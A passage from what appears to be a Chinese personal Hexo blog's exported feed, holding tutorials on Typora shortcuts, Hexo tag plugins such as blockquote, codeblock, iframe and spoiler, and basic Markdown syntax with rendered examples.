<tr>
<td style="text-align:center">段落</td>
<td style="text-align:center"></td>
<td style="text-align:center">有序列表</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">标题</td>
<td style="text-align:center"></td>
<td style="text-align:center">无序列表</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">全选</td>
<td style="text-align:center"></td>
<td style="text-align:center">选中行/句</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">选中段落</td>
<td style="text-align:center"></td>
<td style="text-align:center">选中当前词</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">跳转所选</td>
<td style="text-align:center"></td>
<td style="text-align:center">跳转文首/末</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">源代码模式</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
        <category>Typora</category>
      </categories>
      <tags>
        <tag>Typora</tag>
      </tags>
  </entry>
  <entry>
    <title>【Hexo】标签插件使用</title>
    <url>/posts/eefe99e9/</url>
    <content><![CDATA[<p>「tag 插件」(Tag Plugin) 是 Hexo 提供的一种快速生成特定内容的方式。 例如，在标准 Markdown 语法中，我们无法指定图片的大小。这种情景，我们即可使用标签来解决。 Hexo 内置来许多标签来帮助写作者可以更快的书写， 完整的标签列表 可以参考 <a href="https://hexo.io/docs/tag-plugins.html">Hexo 官网</a>。 另外，Hexo 也开放来接口给主题，使主题有可能提供给写作者更简便的写作方法。</p>
<span id="more"></span>
<h2 id="引用块">引用块</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>blockquote</strong></p>
</li>
</ul>
<p>在文章中插入引言，可包含作者、来源和标题，均可选。</p>
<p>标签方式：使用 <code>blockquote</code> 或者 简写 <code>quote</code>。</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">block</span>quote author, <span class="name">source</span> link source_link_title <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">content</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endblock</span>quote <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">blockquote</span> Corazon, https://www.mcorazon.top Corazon博客首页 %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">这个世界总有黑夜</span></span><br><span class="line"><span class="language-xml">但是我们总发着光</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name">endblockquote</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote><p>这个世界总有黑夜但是我们总发着光</p>
<footer><strong>Corazon,</strong><cite><a href="https://www.mcorazon.top">Corazon博客首页</a></cite></footer></blockquote>	
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>pullquote</strong></p>
</li>
</ul>
<p>pullquote 可以自定义引用块的样式</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;% pullquote [<span class="class"><span class="keyword">class</span>] %&#125;</span></span><br><span class="line"><span class="class"><span class="title">content</span></span></span><br><span class="line"><span class="class"></span>&#123;% endpullquote <span class="variable">%&#125;</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>居中引用</strong></p>
</li>
</ul>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">centerquote</span> %&#125;</span><span class="language-xml">blah blah blah</span><span class="template-tag">&#123;% <span class="name">endcenterquote</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>blah blah blah</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>
<p>同时HTML 居中引用的方式也比较简单：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">blockquote </span>class=<span class="string">&quot;blockquote-center&quot;</span>&gt;<span class="keyword">blah </span><span class="keyword">blah </span><span class="keyword">blah&lt;/blockquote&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">blah blah blah</blockquote>
<h2 id="代码块-a-id-dmk-a">代码块<a id="dmk"></a></h2>
<p>在文章中插入代码，包含指定语言、附加说明和网址，均可选。标签方式：使用 <code>codeblock</code> 或者 简写 <code>code</code>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>codeblock代码块</p>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;% codeblock <span class="selector-attr">[title]</span> <span class="selector-attr">[lang:language]</span> <span class="selector-attr">[url]</span> <span class="selector-attr">[link text]</span> <span class="selector-attr">[additional options]</span> %&#125;</span><br><span class="line"><span class="selector-tag">code</span> snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">codeblock</span> 示例代码 lang:objc https://www.mcorazon.top 博客首页 %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">[rectangle setX: 10 y: 10 width: 20 height: 20];</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name">endcodeblock</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight objc"><figcaption><span>示例代码</span><a href="https://www.mcorazon.top/posts/eefe99e9/#dmk">代码块示例</a></figcaption><table><tr><td class="code"><pre><span class="line">[rectangle setX: <span class="number">10</span> y: <span class="number">10</span> width: <span class="number">20</span> height: <span class="number">20</span>];</span><br></pre></td></tr></table></figure>
<p>在 <code>additional options</code> 中，以 option:value 格式指定附加选项，例如 line_number:false（行数） first_line:5。</p>
<table>
<thead>
<tr>
<th style="text-align:center">Extra Options</th>
<th style="text-align:center">Description</th>
<th style="text-align:center">Default</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>line_number</code></td>
<td style="text-align:center">Show line number</td>
<td style="text-align:center"><code>true</code></td>
</tr>
<tr>
<td style="text-align:center"><code>line_threshold</code></td>
<td style="text-align:center">Only show line numbers as long as the numbers of lines of the code block exceed such threshold.</td>
<td style="text-align:center"><code>0</code></td>
</tr>
<tr>
<td style="text-align:center"><code>highlight</code></td>
<td style="text-align:center">Enable code highlighting</td>
<td style="text-align:center"><code>true</code></td>
</tr>
<tr>
<td style="text-align:center"><code>first_line</code></td>
<td style="text-align:center">Specify the first line number</td>
<td style="text-align:center"><code>1</code></td>
</tr>
<tr>
<td style="text-align:center"><code>mark</code></td>
<td style="text-align:center">Line highlight specific line(s), each value separated by a comma. Specify the number range using a dash Example: <code>mark:1,4-7,10</code> will mark lines 1, 4 to 7 and 10.</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>wrap</code></td>
<td style="text-align:center">Wrap the code block in <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/table">``</a></td>
<td style="text-align:center"><code>true</code></td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p>反引号代码块<a id="fyhdmk"></a></p>
</li>
</ul>
<p>这与使用代码块相同，但使用了三个回车键来分隔代码块。</p>
<p>`` [language] [title] [url] [link text] code snippet ``</p>
<p>示例如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">```python <span class="selector-attr">[反引号代码块示例]</span> https:<span class="comment">//www.mcorazon.top/posts/eefe99e9/#fyhdmk 反引号代码块</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;hello-word&quot;</span>)</span></span> </span><br><span class="line">```</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><figcaption><span>[反引号代码块示例]</span><a href="https://www.mcorazon.top/posts/eefe99e9/#fyhdmk">反引号代码块</a></figcaption><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello-word&quot;</span>) </span><br></pre></td></tr></table></figure>
<h2 id="iframe">iframe</h2>
<p>在文章中嵌入 iframe，</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="selector-tag">iframe</span> url <span class="selector-attr">[width]</span> <span class="selector-attr">[height]</span> %&#125;</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">if</span>rame //player.bilibili.com/player.html?isOutside=true&amp;aid=<span class="number">113446695739195</span>&amp;bvid=BV<span class="number">17</span>rDZYZEM<span class="number">1</span>&amp;cid=<span class="number">26669354075</span>&amp;p=<span class="number">1</span>  <span class="number">500</span>px <span class="number">250</span>px <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113446695739195&bvid=BV17rDZYZEM1&cid=26669354075&p=1" width="500px" height="250px" frameborder="0" loading="lazy" allowfullscreen></iframe>
<p>可能是因为主题的原因，目前video的iframe大小没有设置成功，但网页，图片可以设置。由于目前前端水平不足，暂时不处理。</p>
<p>以下HTML代码可实现同样的功能，不予演示。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?isOutside=true&amp;aid=113446695739195&amp;bvid=BV17rDZYZEM1&amp;cid=26669354075&amp;p=1&quot;</span> <span class="attribute">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attribute">border</span>=<span class="string">&quot;0&quot;</span> <span class="attribute">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attribute">framespacing</span>=<span class="string">&quot;0&quot;</span>  <span class="attribute">allowfullscreen</span>=<span class="string">&quot;true&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<h2 id="图像">图像</h2>
<p>使用标签插入图像可以自定义图像的大小</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&#123;% img [<span class="keyword">class</span> <span class="symbol">names</span>] /<span class="symbol">path</span>/<span class="symbol">to</span>/<span class="symbol">image</span> [<span class="symbol">width</span>] [<span class="symbol">height</span>] &#x27;&quot;<span class="symbol">title</span> <span class="symbol">text</span>&quot; &quot;<span class="symbol">alt</span> <span class="symbol">text</span>&quot;&#x27; %&#125;</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">img</span> imgcls /【Hexo】标签插件使用/<span class="number">004</span>.png <span class="number">20</span>px <span class="number">20</span>px <span class="string">&#x27;&quot;004.png&quot; &quot;这就是我的头像&quot;&#x27;</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<img src="/posts/eefe99e9//004.png" class="imgcls" title="20px 20px &quot;004.png&quot; &quot;这就是我的头像&quot;">
<p><font class="notice"><em><s>mlgbzd</s>，一会儿行一会不行的</em></font></p>
<h2 id="Video-标签">Video 标签</h2>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">video</span> //player.bilibili.com/player.html?isOutside=true&amp;aid=<span class="number">113446695739195</span>&amp;bvid=BV<span class="number">17</span>rDZYZEM<span class="number">1</span>&amp;cid=<span class="number">26669354075</span>&amp;p=<span class="number">1</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<video src="//player.bilibili.com/player.html?isOutside=true&aid=113446695739195&bvid=BV17rDZYZEM1&cid=26669354075&p=1" preload="metadata" controls playsinline poster>Sorry, your browser does not support the video tag.</video>
<h2 id="链接">链接</h2>
<p>插入带有 target=“_blank” 属性的链接。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;% link <span class="selector-tag">text</span> url <span class="selector-attr">[external]</span> <span class="selector-attr">[title]</span> %&#125;</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">&#123;% link <span class="built_in">text</span> https:<span class="comment">// [external] [title] %&#125;</span></span><br></pre></td></tr></table></figure>
<div class="video-container"><iframe src="https://www.youtube.com/embed/lJIrF4YjHfQ" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
<h2 id="折叠展开文字hexo-sliding-spoiler">折叠展开文字hexo-sliding-spoiler</h2>
<p>项目地址：<a href="https://gitcode.com/gh_mirrors/he/hexo-sliding-spoiler">https://gitcode.com/gh_mirrors/he/hexo-sliding-spoiler</a></p>
<h2 id="安装">安装</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-sliding-spoiler --save</span><br></pre></td></tr></table></figure>
<h2 id="语法：">语法：</h2>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">spoiler</span> title %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">内容</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name">endspoiler</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="演示：">演示：</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;% spoiler 标题 %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endspoiler %&#125;</span><br></pre></td></tr></table></figure>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        标题
    </div>
    <div class="spoiler-content">
        <p>内容</p>

    </div>
</div>
<p><font class="notice">注意：标题中包含空格时，用<code>&quot;</code>包括</font></p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/qq_41518277/article/details/101765886">Hexo标签插件的使用</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【Typora】typora知识总结</title>
    <url>/posts/287bb156/</url>
    <content><![CDATA[<h2 id="Markdown语法">Markdown语法</h2>
<h3 id="快捷键汇总">快捷键汇总</h3>
<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">加粗</td>
<td style="text-align:center">Ctrl+B</td>
<td style="text-align:center">插入图像</td>
<td style="text-align:center">Ctrl+Shift+I</td>
</tr>
<tr>
<td style="text-align:center">斜体</td>
<td style="text-align:center">Ctrl+I</td>
<td style="text-align:center">删除线</td>
<td style="text-align:center">Alt+Shift+5</td>
</tr>
<tr>
<td style="text-align:center">下划线</td>
<td style="text-align:center">Ctrl+U</td>
<td style="text-align:center">公式块</td>
<td style="text-align:center">Ctrl+Shift+M</td>
</tr>
<tr>
<td style="text-align:center">超链接</td>
<td style="text-align:center">Ctrl+K</td>
<td style="text-align:center">代码块</td>
<td style="text-align:center">Ctrl+Shift+K</td>
</tr>
<tr>
<td style="text-align:center">表格</td>
<td style="text-align:center">Ctrl+T</td>
<td style="text-align:center">代码段</td>
<td style="text-align:center">Ctrl+Shift+`</td>
</tr>
<tr>
<td style="text-align:center">引用</td>
<td style="text-align:center">&gt;+空格</td>
<td style="text-align:center">退出引用</td>
<td style="text-align:center">Shift+Tab</td>
</tr>
<tr>
<td style="text-align:center">段落</td>
<td style="text-align:center">Ctrl+0</td>
<td style="text-align:center">有序列表</td>
<td style="text-align:center">Ctrl+Shift+[</td>
</tr>
<tr>
<td style="text-align:center">标题</td>
<td style="text-align:center">Ctrl+数字</td>
<td style="text-align:center">无序列表</td>
<td style="text-align:center">Ctrl+Shift+]</td>
</tr>
<tr>
<td style="text-align:center">全选</td>
<td style="text-align:center">Ctrl+A</td>
<td style="text-align:center">选中行/句</td>
<td style="text-align:center">Ctrl+L</td>
</tr>
<tr>
<td style="text-align:center">选中段落</td>
<td style="text-align:center">Ctrl+E</td>
<td style="text-align:center">选中当前词</td>
<td style="text-align:center">Ctrl+D</td>
</tr>
<tr>
<td style="text-align:center">跳转所选</td>
<td style="text-align:center">Ctrl+J</td>
<td style="text-align:center">跳转文首/末</td>
<td style="text-align:center">Ctrl+Home/End</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">源代码模式</td>
<td style="text-align:center">Ctrl+/</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<h3 id="段落">段落</h3>
<h4 id="标题">标题</h4>
<p>使用 # 可以表示标题，一级标题对应一个 # ，二级标题对应两个 # 号，最多至六级标题。在Typora中，# 后要紧接着一个空格才能表示标题，否则就是普通字符。</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># h1   <span class="comment">//一级标题 对应 &lt;h1&gt; &lt;/h1&gt;</span></span><br><span class="line">## h2   <span class="comment">//二级标题 对应 &lt;h2&gt; &lt;/h2&gt;</span></span><br><span class="line">### h3  <span class="comment">//三级标题 对应 &lt;h3&gt; &lt;/h3&gt;</span></span><br><span class="line">#### h4  <span class="comment">//四级标题 对应 &lt;h4&gt; &lt;/h4&gt;</span></span><br><span class="line">##### h5  <span class="comment">//五级标题 对应 &lt;h5&gt; &lt;/h5&gt;</span></span><br><span class="line">###### h6  <span class="comment">//六级标题 对应 &lt;h6&gt; &lt;/h6&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="字体">字体</h4>
<table>
<thead>
<tr>
<th style="text-align:center">格式</th>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
<th style="text-align:center">展示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">*这是斜体*<br>_这是斜体_</td>
<td style="text-align:center">斜体文本</td>
<td style="text-align:center">Ctrl+I</td>
<td style="text-align:center"><em>这是斜体</em></td>
</tr>
<tr>
<td style="text-align:center">**这是粗体**<br>__这是粗体__</td>
<td style="text-align:center">粗体文本</td>
<td style="text-align:center">Crtl+B</td>
<td style="text-align:center"><strong>这是粗体</strong></td>
</tr>
<tr>
<td style="text-align:center">***这是粗斜体***<br>___这是粗斜体___</td>
<td style="text-align:center">粗斜体文本</td>
<td style="text-align:center">无</td>
<td style="text-align:center"><em><strong>这是粗斜体</strong></em></td>
</tr>
</tbody>
</table>
<p>在hexo中，为避免字体样式错误，最好不要让修改字体样式的标识符中紧挨别的字符，或者在两端外添加空格。以如下代码进行示范：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="strong">**你好**</span>。我是全世界最帅的人</span><br><span class="line"><span class="strong">**你好。**</span>我是全世界最帅的人</span><br><span class="line"><span class="strong">**你好。**</span> 我是全世界最帅的人</span><br></pre></td></tr></table></figure>
<p><font class="notice">注：第二行其实没有空格，因为装了auto_spacing，强制加了空格</font></p>
<p><strong>你好</strong>。我是全世界最帅的人</p>
<p>**你好。**我是全世界最帅的人</p>
<p><strong>你好。</strong> 我是全世界最帅的人</p>
<p><font size="2">注：在typora中，并不会造成错误</font></p>
<h4 id="代码">代码</h4>
<p>如果是一行代码，可以使用段内代码块来表示，用一对 <strong>'</strong>（数字1旁边的符号）括住代码。比如<code>printf(&quot;Hello World!&quot;)</code></p>
<p>如果是代码段，那么可以使用<strong>三个 ` 加Enter/空格+编程语言</strong>来表示。如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以在代码块的右下角选择编程语言。</p>
<h4 id="链接-a-id-t1p8-a">链接<a id="t1p8"></a></h4>
<p>我们可以使用链接打开网页，也可以打开本地文件和实现页内跳转。链接的几种使用方式如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="selector-attr">[链接文字]</span>(链接地址)</span><br><span class="line"><span class="number">2</span>.&lt;链接地址&gt;</span><br><span class="line"><span class="number">3</span>.<span class="selector-attr">[链接文字]</span><span class="selector-attr">[链接ID]</span></span><br><span class="line">  <span class="selector-attr">[链接ID]</span>:http:<span class="comment">//XXXXXXXX.XXX</span></span><br><span class="line"><span class="number">4</span>.<span class="selector-attr">[链接文字]</span><span class="selector-attr">[]</span></span><br><span class="line">  <span class="selector-attr">[链接文字]</span>:http:<span class="comment">//XXXXXXXX.XXX</span></span><br></pre></td></tr></table></figure>
<p>以下列样例进行演示：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="selector-attr">[百度]</span>(https:<span class="comment">//www.baidu.com/ &quot;百度搜索&quot;)   绝对链接</span></span><br><span class="line"><span class="number">2</span>.&lt;https:<span class="comment">//www.baidu.com/&gt;</span></span><br><span class="line"><span class="number">3</span>.<span class="selector-attr">[About]</span>(/about/ <span class="string">&quot;关于我&quot;</span>)   相对链接</span><br><span class="line"><span class="number">4</span>.<span class="selector-attr">[打开hello-word文档]</span>(../<span class="number">4</span>a17b156 <span class="string">&quot;hello-world&quot;</span>)  相对链接打开文章</span><br><span class="line"><span class="number">5</span>.<span class="selector-attr">[打开002.png照片]</span>(../../images/<span class="number">002</span><span class="selector-class">.png</span> <span class="string">&quot;002.png&quot;</span>)  相对链接打开图片</span><br><span class="line"><span class="number">6</span>.<span class="selector-attr">[My Home]</span><span class="selector-attr">[ID]</span></span><br><span class="line"><span class="selector-attr">[ID]</span>:https:<span class="comment">//www.mcorazon.top &quot;我的博客主页&quot;</span></span><br><span class="line"><span class="number">7</span>.<span class="selector-attr">[My Home]</span><span class="selector-attr">[]</span></span><br><span class="line"><span class="selector-attr">[My Home]</span>:https:<span class="comment">//www.mcorazon.top &quot;我的博客主页&quot;</span></span><br><span class="line"><span class="number">8</span>.<span class="selector-attr">[跳转到此小节首]</span>(#t1p8）</span><br></pre></td></tr></table></figure>
<p><font size="2"><em>注：1. 引号部分表示title，可以省略。样式2不可加title<br>2. 不能使用<code>&lt;  &gt;</code>跳转本地文件，如&lt;../../images/002.png&gt; ，其并不会表示为可连接状态<br>3.同时，使用第八个样例时需要添加锚点，在1.8的标题后添加了<code>&lt;a id=&quot;t1p8&quot;&gt;&lt;/a&gt;</code></em></font></p>
<p>以上代码的结果如下：</p>
<p>1.<a href="https://www.baidu.com/" title="百度搜索">百度</a>      绝对链接<br>
2.&lt;<a href="https://www.baidu.com/">https://www.baidu.com/</a> &gt;<br>
3.<a href="/about/" title="关于我">About</a>       相对链接<br>
4.<a href="../4a17b156" title="hello-world">打开hello-word文档</a>      相对链接打开文章<br>
5.<a href="../../images/002.png" title="002.png">打开002.png照片</a>      相对链接打开图片<br>
6.<a href="https://www.mcorazon.top" title="我的博客主页">My Home</a>     我的博客主页</p>
<p>7.<a href="https://www.mcorazon.top" title="我的博客主页">My Home</a>     我的博客主页</p>
<p>8.<a href="#t1p8">跳转到此小节首</a></p>
<h4 id="上标下标">上标下标</h4>
<p>上下标可以使用<code>^X^</code>，<code>~X~</code>来实现。如：</p>
<p>上标：a<sup>X</sup>，下标：a<sub>X</sub></p>
<p><s>如果作为上标、下标的符号不止一个，则需要用花括号{}将其括起来。如：</s></p>
<p><s>上 标 为 12 ： a 12 , 下 标 为 34 ： a 34 上标为12：a<sup>{12},下标为34：a~{34</sup>2^}~ 上标为12：a<sup>12</sup>,下标为34：a34</s></p>
<h4 id="特殊符号">特殊符号</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>（1）对于 Markdown 中的语法符号，前面加反斜线\即可显示符号本身。</p>
</li>
<li class="lvl-2">
<p>（2）其他特殊字符使用Unicode码表示，示例如下：</p>
<p><img src="/posts/287bb156//image-20241110173249216.png" alt="image-20241110173249216"></p>
</li>
</ul>
<h3 id="其他">其他</h3>
<h4 id="各种线">各种线</h4>
<p>你可以在一行中用三个以上的星号(*)、减号(-)、底线(_)来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">***</span></span><br><span class="line"><span class="string">___</span></span><br></pre></td></tr></table></figure>
<hr>
<hr>
<hr>
<h4 id="列表">列表</h4>
<ol>
<li class="lvl-3">
<p><strong>无序列表</strong></p>
</li>
</ol>
<p>使用*，+或-标记符号加空格来表示无需列表项，示例如下</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">*</span> 第一项</span><br><span class="line"><span class="bullet">*</span> 第二项</span><br><span class="line"><span class="bullet">+</span> 第一项</span><br><span class="line"><span class="bullet">+</span> 第二项</span><br><span class="line"><span class="bullet">-</span> 第一项</span><br><span class="line"><span class="bullet">-</span> 第二项</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>第一项</p>
</li>
<li class="lvl-2">
<p>第二项</p>
</li>
</ul>
<ul class="lvl-0">
<li class="lvl-2">
<p>第一项</p>
</li>
<li class="lvl-2">
<p>第二项</p>
</li>
</ul>
<ul class="lvl-0">
<li class="lvl-2">
<p>第一项</p>
</li>
<li class="lvl-2">
<p>第二项</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p><strong>有序列表</strong></p>
</li>
</ol>
<p>使用数字加.再加空格来表示有序列表，其中，数字并不重要。示例如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> 第一项</span><br><span class="line"><span class="bullet">3.</span> 第二项</span><br><span class="line"><span class="bullet">10.</span> 第三项</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>第一项</p>
</li>
<li class="lvl-3">
<p>第二项</p>
</li>
<li class="lvl-3">
<p>第三项</p>
</li>
<li class="lvl-3">
<p><strong>嵌套列表</strong></p>
</li>
</ol>
<p>首先使用<code>*</code>、<code>+</code>或<code>-</code>进入列表，然后回车换行，会发现系统自动生成列表第二项，此时按下<strong>Tab</strong>键，列表第二项变为第一项的子列表。<strong>按回车退出当前列表</strong>。可以在无序列表中嵌套有序列表。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> 1. 一</span><br><span class="line"><span class="bullet">   1.</span> 一.一</span><br><span class="line"><span class="bullet">      1.</span> 一.一.一</span><br><span class="line"><span class="bullet">      2.</span> 一.一.二</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>一</p>
<ol>
<li class="lvl-6">
<p>一.一</p>
<ol>
<li class="lvl-9">一.一.一</li>
<li class="lvl-9">一.一.二</li>
</ol>
</li>
<li class="lvl-6">
<p>一.二</p>
<ol>
<li class="lvl-9">一.二.一</li>
<li class="lvl-9">一.二.二</li>
</ol>
</li>
</ol>
</li>
</ol>
<h4 id="区块">区块</h4>
<p>可以使用<code>&gt;</code>加空格来表示区块。</p>
<p>当我们想要引用别人的文章内容或者需要对文字进行强调时，可以将其放在区块内。</p>
<blockquote>
<p>这是区块</p>
<p>区块也可以嵌套</p>
<blockquote>
<p>​	这是二级区块</p>
<blockquote>
<p>这是三级区块</p>
</blockquote>
</blockquote>
</blockquote>
<h4 id="图片">图片</h4>
<p><strong>引用图片和链接的唯一区别就是在最前方添加一个感叹号。</strong> 插入图片的语法如下：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址)</span><br><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址 &quot;可选标题&quot;)</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. !<span class="selector-attr">[绝对路径引用]</span>(/images/<span class="number">002</span><span class="selector-class">.png</span> <span class="string">&quot;绝对路径引用&quot;</span> =<span class="number">200</span>*<span class="number">200</span>)</span><br><span class="line"><span class="number">2</span>. !<span class="selector-attr">[相对路径引用]</span>(【Hexo】typora知识总结/<span class="number">001</span><span class="selector-class">.jpg</span> <span class="string">&quot;相对路径引用1&quot;</span>)</span><br><span class="line"><span class="number">3</span>. !<span class="selector-attr">[相对路径引用]</span>(<span class="number">001</span><span class="selector-class">.jpg</span> <span class="string">&quot;相对路径引用2&quot;</span>)</span><br><span class="line"><span class="number">4</span>. !<span class="selector-attr">[网络图片]</span>（https:<span class="comment">//www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png &quot;Baidu&quot;)</span></span><br></pre></td></tr></table></figure>
<p>由于使用插件markdown-it-imsize控制了图片大小，此图片在 typora 中无法显示↓</p>
<p><img src="/posts/287bb156//002.png" alt="本地png图片" title="绝对路径引用" width="200" height="200"></p>
<p><img src="/posts/287bb156//001.jpg" alt="相对路径引用" title="相对路径引用1"></p>
<p>由于使用了post_asset_folder，此图片在 typora 中无法显示↓</p>
<p><img src="/posts/287bb156//001.jpg" alt="相对路径引用" title="相对路径引用2"></p>
<p><img src="/posts/287bb156//PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png" alt="网络图片" title="Baidu"></p>
<p><font class="notice">注：因为我的 typora 使用了图片自动下载功能，会强制改为本地图片，因此此处已经自动下载到了本地，并且依然使用的本地图片。</font></p>
